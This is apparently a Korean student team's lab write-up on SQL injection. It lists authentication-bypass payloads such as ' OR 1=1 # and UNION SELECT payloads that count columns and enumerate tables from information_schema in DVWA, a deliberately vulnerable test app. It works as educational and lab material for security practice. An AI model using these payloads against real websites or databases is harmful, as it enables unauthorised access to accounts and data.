##  SQL Injection 구현 및 log 분석
SQL injection: 주민서, 이종학

log 분석: 김현서, 허남정, 오성택

---
###  1. 조건문을 이용한 SQL Injection
이 유형의 payload는 WHERE절의 조건을 항상 참으로 만들어 조건을 우회하는 방법 입니다.
- ' OR 1=1 #
- ' OR TRUE #
- ' OR '1'='1' #
- ' OR '1'='1' LIMIT 1 #
- ' OR TRUE LIMIT 1 #
- ' OR 1=1 LIMIT 5 #

이런 payload는 다음과 같은 쿼리가 있다고 가정했을 때 사용합니다.

SELECT * FROM table WHERE id = 'sql_injection' AND pw = 'sql_injection’

WHERE절의 조건이 항상 참이 되므로 모든 행이 반환됩니다.

---
### 2. UNION SELECT
UNION은 두 개 이상의 SELECT문의 결과를 하나의 결과로 만들어줍니다. 이때 각 SELECT문은 같은 수의 컬럼을 가져야 하며, 각 열의 데이터 타입이 일치해야 합니다. 이러한 특성을 이용해 데이터베이스의 구조나 정보를 알아낼 수 있습니다. 사용된 payload를 확인해보면 컬럼의 길이, 테이블 이름, 컬럼의 데이터를 알아내는데 사용되었습니다.
- ' UNION SELECT 1 #
- ' UNION SELECT 1, 2 #
- ' UNION SELECT 1, 2, 3 #
- ' UNION SELECT 1, table_name FROM information_schema.tables #
- ' UNION SELECT table_name,2 FROM information_schema.tables #
- ' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa' #
- ' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='dvwa' #

위 예시의 쿼리문들을 이용해 컬럼의 개수 및 데이터베이스의 정보를 알아내는데 사용할 수 있습니다.
